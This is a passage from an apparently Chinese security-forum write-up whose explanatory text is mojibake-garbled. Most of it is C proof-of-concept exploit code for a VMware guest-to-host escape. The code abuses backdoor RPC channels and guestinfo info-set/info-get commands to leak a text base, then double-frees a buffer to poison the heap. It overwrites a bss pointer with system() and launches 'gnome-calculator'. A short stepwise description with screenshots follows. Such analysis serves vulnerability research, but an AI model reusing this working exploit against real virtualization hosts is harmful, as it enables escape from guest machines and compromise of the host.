class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFD0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å…¶ä¸­ä¿®æ”¹äº†é•¿äº­å¸ˆå‚…çš„ä¸€ä¸ªé­”æ•°ï¼Œç›®çš„æ˜¯è¾¾åˆ°no enhancedã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä¸­æ„é€ çš„exploitå¦‚ä¸‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" alt="å›¾ç‰‡.png"><br> å¼€å¯å››ä¸ªchannel</p><p>ç„¶åfreeï¼ˆ0ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" alt="å›¾ç‰‡.png"></p><p>setä¹‹åå†æ¬¡free(0)</p><p>æ­¤æ—¶å¾€channel 1 å¯ä»¥å†™å…¥bssæ®µçš„åœ°å€ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" alt="å›¾ç‰‡.png"></p><p>æ­¤æ—¶fdè¢«é“¾æ¥è¿›å»ä¹‹åå¯ä»¥ç›´æ¥mallocå‡ºæ¥ç„¶åæ”¹å†™å³å¯ã€‚</p><p>æ­¤å¤„è¦†ç›–çš„ä½ç½®ä¸ºbssæ®µçš„ä¸€å¤„è°ƒç”¨</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" 